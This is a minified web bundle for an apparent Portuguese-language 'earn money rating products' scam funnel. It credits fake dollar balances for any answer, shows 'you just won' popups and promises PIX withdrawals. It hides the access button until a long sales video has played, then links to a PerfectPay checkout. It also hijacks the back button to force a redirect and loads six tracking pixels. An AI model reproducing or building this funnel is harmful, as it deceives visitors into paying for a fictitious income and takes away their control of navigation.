(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[97],{9657:(e,t,a)=>{Promise.resolve().then(a.bind(a,4869))},4869:(e,t,a)=>{"use strict";a.r(t),a.d(t,{default:()=>R});var n=a(632),i=a(5268),s=a(3099),r=a(5438),l=a(5611),c=a(641),o=a(8461),d=a(2744),p=a(2486),u=a(5496),m=a(425),x=a(8807),f=a(7008),h=a(4394),b=a(3745),v=a(6383);function g(e){let{onClose:t}=e,{brlBalance:a}=(0,v.I)();return(0,n.jsxs)("div",{className:"flex flex-col items-center gap-4 text-primary",children:[(0,n.jsx)("span",{className:"font-bold font-souvenir text-center text-[1.75rem] leading-[34.9px]",children:"Parab\xe9ns!"}),(0,n.jsxs)("p",{className:"text-center font-bold leading-[18.96px]",children:["Voc\xea acaba de ganhar ",(0,n.jsxs)("span",{className:"text-red-1",children:[(0,u.r)(a),"!"]})]}),(0,n.jsxs)("p",{className:"text-center leading-[18.96px] font-medium",children:["Assista um curto v\xeddeo com um passo a passo explicativo para voc\xea aprender a cadastrar sua chave ",(0,n.jsx)("span",{className:"font-bold",children:"PIX"})," e realizar o seu primeiro ",(0,n.jsx)("span",{className:"font-bold",children:"SAQUE."})]}),(0,n.jsx)(b.j,{variant:"primary",onClick:t,children:"Assistir v\xeddeo"})]})}function j(e){let{onClose:t}=e,{brlBalance:a}=(0,v.I)();return(0,n.jsxs)("div",{className:"flex flex-col items-center text-primary text-center",children:[(0,n.jsx)(f.X2,{}),(0,n.jsxs)("div",{className:"flex flex-col items-center gap-4",children:[(0,n.jsx)("span",{className:"text-[1.75rem] font-bold leading-[34.9px] font-souvenir",children:"Parab\xe9ns!"}),(0,n.jsxs)("p",{className:"leading-[18.96px] font-bold",children:["Voc\xea acumulou ",(0,n.jsxs)("span",{className:"text-red-1",children:[(0,u.r)(a),"!"]})]}),(0,n.jsxs)("p",{className:"leading-[18.96px] font-medium",children:[(0,n.jsx)("span",{className:"text-red-1",children:"Aten\xe7\xe3o:"})," Assista um aviso importante de 30 segundos para finalizar seu saque!"]}),(0,n.jsx)(b.j,{variant:"primary",onClick:t,children:"Assistir v\xeddeo"})]})]})}var y=a(698);let w=[{img:"img/presell/1.webp",amount:8.05,currentQuestion:1},{img:"img/presell/2.webp",amount:7.24,currentQuestion:2},{img:"img/presell/3.webp",amount:9.36,currentQuestion:3},{img:"img/presell/4.webp",amount:14.27,currentQuestion:4},{img:"img/presell/5.webp",amount:14.427,currentQuestion:5},{img:"img/presell/6.webp",amount:14.3,currentQuestion:6}],N=[1,2,4,5],S=(e,t)=>e.filter(e=>e.currentQuestion===t).sort(()=>Math.random()-.5)[0],k={hidden:{opacity:0},visible:{opacity:1,transition:{duration:.1}},exit:{opacity:0,transition:{duration:.1}}};function C(){var e;let[t,a]=(0,i.useState)(!0),[r,c]=(0,i.useState)(!1),[o,v]=(0,i.useState)(!1),[C,_]=(0,i.useState)(!1),[L,A]=(0,i.useState)((0,m.Ak)(4)),[E,P]=(0,i.useState)(null),{dollar:I,balance:V,setBalance:T,currentQuestion:M,setCurrentQuestion:q,setPagePresell:H}=(0,s.u)();function O(){var e;let t=V+(null!==(e=null==E?void 0:E.amount)&&void 0!==e?e:0);N.includes(M)&&(c(!0),setTimeout(()=>{c(!1),setTimeout(()=>{A((0,m.Ak)(4))},200)},2800)),3===M&&v(!0),M>3&&localStorage.setItem("_balance",t.toString()),6===M&&_(!0),new Audio((0,y.D)("/sound/cashing.mp3")).play().catch(e=>{console.error("Erro ao tocar o \xe1udio:",e)}),T(t)}(0,i.useEffect)(()=>{a(!0),setTimeout(()=>{a(!1),q(e=>{let t=e+1;return P(S(w,t)),t})},800)},[L]);let R=(null!==(e=null==E?void 0:E.amount)&&void 0!==e?e:0)*I;return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(p.default,{isOpen:r,variant:"secondary",children:(0,n.jsxs)("div",{className:"flex flex-col items-center gap-4",children:[(0,n.jsx)(d.J,{}),(0,n.jsx)("strong",{className:"font-bold text-[26px] text-primary leading-[28.15px] font-souvenir text-center",children:"Saldo atualizado!"}),(0,n.jsx)("p",{className:"text-center text-base text-primary font-bold leading-[18.77px]",children:"Voc\xea recebeu:"}),(0,n.jsx)("p",{className:"text-center text-[46px] text-red-1 font-bold leading-[35px]",children:(0,u.r)(R)})]})}),(0,n.jsx)(p.default,{isOpen:o,children:(0,n.jsx)(g,{onClose:()=>H("vsl")})}),(0,n.jsx)(p.default,{isOpen:C,children:(0,n.jsx)(j,{onClose:()=>H("vsl-pr")})}),(0,n.jsx)(h.N,{mode:"wait",children:!t&&(null==E?void 0:E.img)?(0,n.jsxs)(l.P.div,{initial:"hidden",animate:"visible",exit:"exit",variants:k,className:"pt-[18px] pb-[39px] px-mobile-18",children:[(0,n.jsxs)("div",{className:"relative rounded-md overflow-hidden w-full aspect-[500/328]",children:[(0,n.jsx)("img",{src:E.img,width:500,height:500,className:"w-full object-contain pointer-events-none",alt:""}),(0,n.jsxs)("span",{className:"absolute top-0 right-0 bg-primary text-white p-2 pl-[14px] rounded-es-[25px] font-rubik font-bold leading-[21.33px]",children:["+US",(0,u.P)(E.amount)]})]}),(0,n.jsxs)("div",{className:"flex flex-col gap-4 pt-[20px]",children:[(0,n.jsx)("h2",{className:"text-center font-bold leading-[18.96px]",children:"Voc\xea compraria esse produto?"}),(0,n.jsxs)(b.j,{variant:"primary",animate:!1,onClick:O,children:["Com certeza!",(0,n.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 20 20",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,n.jsx)("path",{d:"M15 17.5H6.66669V6.66665L12.5 0.833313L13.5417 1.87498C13.6389 1.9722 13.7188 2.10415 13.7813 2.27081C13.8438 2.43748 13.875 2.5972 13.875 2.74998V3.04165L12.9584 6.66665H17.5C17.9445 6.66665 18.3334 6.83331 18.6667 7.16665C19 7.49998 19.1667 7.88887 19.1667 8.33331V9.99998C19.1667 10.0972 19.1563 10.2014 19.1354 10.3125C19.1146 10.4236 19.0834 10.5278 19.0417 10.625L16.5417 16.5C16.4167 16.7778 16.2084 17.0139 15.9167 17.2083C15.625 17.4028 15.3195 17.5 15 17.5ZM5.00002 6.66665V17.5H1.66669V6.66665H5.00002Z",fill:"white"})})]}),(0,n.jsx)(b.j,{variant:"secondary",animate:!1,onClick:O,children:"N\xe3o sei ao certo..."}),(0,n.jsxs)(b.j,{variant:"third",animate:!1,onClick:O,children:[(0,n.jsx)("svg",{width:"19",height:"18",viewBox:"0 0 19 18",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,n.jsx)("path",{d:"M4.99998 0.499989L13.3333 0.49999L13.3333 11.3333L7.49998 17.1667L6.45831 16.125C6.36109 16.0278 6.28123 15.8958 6.21873 15.7292C6.15623 15.5625 6.12498 15.4028 6.12498 15.25L6.12498 14.9583L7.04165 11.3333L2.49998 11.3333C2.05553 11.3333 1.66665 11.1667 1.33331 10.8333C0.99998 10.5 0.833314 10.1111 0.833314 9.66666L0.833314 7.99999C0.833314 7.90277 0.84373 7.7986 0.864564 7.68749C0.885396 7.57638 0.916646 7.47221 0.958314 7.37499L3.45831 1.49999C3.58331 1.22221 3.79165 0.9861 4.08331 0.791657C4.37498 0.597213 4.68054 0.499989 4.99998 0.499989ZM15 11.3333L15 0.49999L18.3333 0.49999L18.3333 11.3333L15 11.3333Z",fill:"white"})}),"Jamais!"]})]})]},"survey_".concat(L)):(0,n.jsxs)(l.P.div,{initial:"hidden",animate:"visible",exit:"exit",variants:k,className:"flex flex-col",children:[(0,n.jsx)(f.v4,{}),(0,n.jsxs)("div",{className:"flex items-center justify-center gap-2",children:[(0,n.jsx)(x.e,{className:"size-4 animate-spin fill-primary/70"}),(0,n.jsx)("h1",{className:"text-primary/70 font-bold leading-[16.59px] tracking-[0..08em] text-sm font-rubik animate-pulse",children:"PROCURANDO NOVA AVALIA\xc7\xc3O..."})]})]},"loading_".concat(L))})]})}function _(){let[e]=(0,i.useState)("answer-question"),t={"answer-question":(0,n.jsx)(C,{})};return(0,n.jsx)("div",{className:"flex flex-col",children:(0,n.jsx)(l.P.div,{initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},transition:{duration:.3},children:t[e]},"page-".concat(e))})}var L=a(7236);function A(){return(0,n.jsx)("svg",{width:12,height:12,viewBox:"0 0 12 12",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,n.jsx)("path",{d:"M0.5 10.5H11.5L6 1L0.5 10.5ZM6.5 9H5.5V8H6.5V9ZM6.5 7H5.5V5H6.5V7Z",fill:"#EF4444"})})}let E=(0,i.memo)(()=>(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("div",{dangerouslySetInnerHTML:{__html:'<div id="vid_67a4dcc938df934997b9de53" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_67a4dcc938df934997b9de53" src="https://images.converteai.net/2e8fc70c-53af-4f29-af7e-e4d40fc994f9/players/67a4dcc938df934997b9de53/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_67a4dcc938df934997b9de53" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div>'}}),(0,n.jsx)(L.default,{type:"text/javascript",id:"scr_67a4dcc938df934997b9de53",src:"https://scripts.converteai.net/2e8fc70c-53af-4f29-af7e-e4d40fc994f9/players/67a4dcc938df934997b9de53/player.js",async:!0})]}));function P(){let{setPagePresell:e}=(0,s.u)(),[t,a]=(0,i.useState)(!1);return(0,i.useEffect)(()=>{let e=0,t="true"===new URLSearchParams(window.location.search).get("nodelay"),n=t,i="alreadyElsDisplayed".concat(600),s=t?"true":localStorage.getItem(i),r=function(){n=!0,a(!0),localStorage.setItem(i,"true")},l=function(){if("undefined"==typeof smartplayer||!smartplayer.instances){if(e>=10)return;return e+=1,setTimeout(function(){l()},1e3)}let t=smartplayer.instances.find(e=>"67a4dcc938df934997b9de53"===e.options.id);if(!t){if(e>=10)return;return e+=1,setTimeout(function(){l()},1e3)}t.on("timeupdate",()=>{n||t.smartAutoPlay||t.video.currentTime<600||r()})};"true"===s?setTimeout(function(){r()},100):l()},[]),(0,n.jsxs)("div",{className:"py-[18px] px-mobile-18 space-y-[18px]",children:[(0,n.jsxs)("h1",{className:"flex items-center justify-center gap-3 text-sm font-semibold leading-none text-primary tracking-[0.1px]",children:[(0,n.jsx)(A,{}),"Assista esse v\xeddeo com aten\xe7\xe3o!"]}),(0,n.jsx)("div",{className:"w-full overflow-hidden rounded-[6px]",children:(0,n.jsx)(E,{})}),t&&(0,n.jsx)(b.j,{variant:"primary",onClick:()=>e("wallet"),children:"LIBERAR ACESSO!"})]})}E.displayName="VslMemoized";var I=a(6770);let V=(0,i.memo)(()=>(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("div",{dangerouslySetInnerHTML:{__html:'<div id="vid_67a4e19c9a55b614dc719e6b" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_67a4e19c9a55b614dc719e6b" src="https://images.converteai.net/2e8fc70c-53af-4f29-af7e-e4d40fc994f9/players/67a4e19c9a55b614dc719e6b/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_67a4e19c9a55b614dc719e6b" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div>'}}),(0,n.jsx)(L.default,{type:"text/javascript",id:"scr_67a4e19c9a55b614dc719e6b",src:"https://scripts.converteai.net/2e8fc70c-53af-4f29-af7e-e4d40fc994f9/players/67a4e19c9a55b614dc719e6b/player.js",async:!0})]}));function T(){let[e,t]=(0,i.useState)(!1);return(0,i.useEffect)(()=>{let e=0,a="true"===new URLSearchParams(window.location.search).get("nodelay"),n=a,i="alreadyElsDisplayed".concat(312),s=a?"true":localStorage.getItem(i),r=function(){n=!0,t(!0),localStorage.setItem(i,"true")},l=function(){if("undefined"==typeof smartplayer||!smartplayer.instances){if(e>=10)return;return e+=1,setTimeout(function(){l()},1e3)}let t=smartplayer.instances.find(e=>"67a4e19c9a55b614dc719e6b"===e.options.id);if(!t){if(e>=10)return;return e+=1,setTimeout(function(){l()},1e3)}t.on("timeupdate",()=>{n||t.smartAutoPlay||t.video.currentTime<312||r()})};"true"===s?setTimeout(function(){r()},100):l()},[]),(0,n.jsxs)("div",{className:"py-[18px] px-mobile-18 space-y-[18px]",children:[(0,n.jsxs)("h1",{className:"flex items-center justify-center gap-3 text-sm font-semibold leading-none text-primary tracking-[0.1px]",children:[(0,n.jsx)(A,{}),"Assista esse v\xeddeo com aten\xe7\xe3o!"]}),(0,n.jsx)("div",{className:"w-full overflow-hidden rounded-[6px]",children:(0,n.jsx)(V,{})}),e&&(0,n.jsx)(b.N,{href:"https://go.perfectpay.com.br/PPU38CPGGI6",extraParams:{hidecard:1},children:"LIBERAR ACESSO!"}),(0,n.jsx)(L.default,{id:"utmify",src:"https://cdn.utmify.com.br/scripts/utms/latest.js",async:!0,defer:!0})]})}function M(e){let{onClose:t}=e,{brlBalance:a}=(0,v.I)();return(0,n.jsxs)("div",{className:"flex flex-col items-center gap-4 text-primary",children:[(0,n.jsx)("span",{className:"text-center text-[1.75rem] leading-[34.9px] font-bold font-souvenir",children:"Parab\xe9ns!"}),(0,n.jsx)("p",{className:"text-center font-medium leading-[18.96px]",children:"Voc\xea acaba de ganhar 1 licen\xe7a gratuita para avaliar produtos em nosso app!"}),(0,n.jsxs)("p",{className:"text-center leading-[18.96px] font-bold",children:["Aproveite, voc\xea j\xe1 ganhou ",(0,n.jsxs)("span",{className:"text-red-1",children:[(0,u.r)(a),"!"]})]}),(0,n.jsx)("p",{className:"text-center leading-[18.96px] font-medium",children:"Avalie 3 produtos e realize seu primeiro saque!"}),(0,n.jsx)(b.j,{variant:"primary",onClick:t,children:"Come\xe7ar!"})]})}V.displayName="VslMemoized";let q=["521541020316746","906370731358025","2156965161387695","1409892576844748","3899892856917314","1360181935229098"],H=()=>((0,i.useEffect)(()=>{q.forEach((e,t)=>{window.fbq&&window.fbq("track","PageView",{},"pixel".concat(t+1))})},[]),(0,n.jsxs)(n.Fragment,{children:[q.map((e,t)=>(0,n.jsx)(L.default,{id:"fb-pixel-".concat(t+1),strategy:"afterInteractive",dangerouslySetInnerHTML:{__html:"\n              !function(f,b,e,v,n,t,s)\n              {if(f.fbq)return;n=f.fbq=function(){n.callMethod?\n              n.callMethod.apply(n,arguments):n.queue.push(arguments)};\n              if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';\n              n.queue=[];t=b.createElement(e);t.async=!0;\n              t.src=v;s=b.getElementsByTagName(e)[0];\n              s.parentNode.insertBefore(t,s)}\n              (window, document,'script','https://connect.facebook.net/en_US/fbevents.js');\n              fbq('init', '".concat(e,"', {}, 'pixel").concat(t+1,"');\n            ")}},"fb-pixel-".concat(t+1))),(0,n.jsx)(L.default,{id:"fb-pixel-event",strategy:"afterInteractive",dangerouslySetInnerHTML:{__html:"\n            window.addEventListener('load', function() {\n              ".concat(q.map((e,t)=>"fbq('track', 'PageView', {}, 'pixel".concat(t+1,"');")).join("\n"),"\n            });\n          ")}})]})),O=(0,r.default)(()=>Promise.resolve().then(a.bind(a,2486)),{loadableGenerated:{webpack:()=>[2486]},ssr:!1});function R(){let[e,t]=(0,i.useState)(!0),{pagePresell:a}=(0,s.u)(),[r,d]=(0,i.useState)(!0),p=(0,c.useRouter)(),u={home:(0,n.jsx)(_,{}),vsl:(0,n.jsx)(P,{}),wallet:(0,n.jsx)(I.u,{}),"vsl-pr":(0,n.jsx)(T,{})};return((0,i.useEffect)(()=>{if(!localStorage.getItem("_visited_presell")){localStorage.setItem("_visited_presell","true"),t(!1);return}let e="/back1"+document.location.search;p.replace(e)},[]),(0,i.useEffect)(()=>{let e=window.location.origin,t="".concat(e).concat("/funil-1").concat("/back1").trim()+(e.indexOf("?")>0?"&":"?")+document.location.search.replace("?","").toString();return history.pushState({},"",location.href),history.pushState({},"",location.href),window.onpopstate=function(){setTimeout(function(){location.href=t},1)},()=>{window.onpopstate=null}},[]),e)?null:(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(H,{}),(0,n.jsx)(o.Y,{}),(0,n.jsx)(l.P.main,{initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},transition:{duration:.3},className:"pt-[4.375rem] min-h-dvh flex flex-col",children:u[a]},"page-".concat(a)),(0,n.jsx)(O,{isOpen:r,children:(0,n.jsx)(M,{onClose:()=>d(!1)})})]})}}},e=>{var t=t=>e(e.s=t);e.O(0,[190,761,595,601,477,851,15,723,358],()=>t(9657)),_N_E=e.O()}]);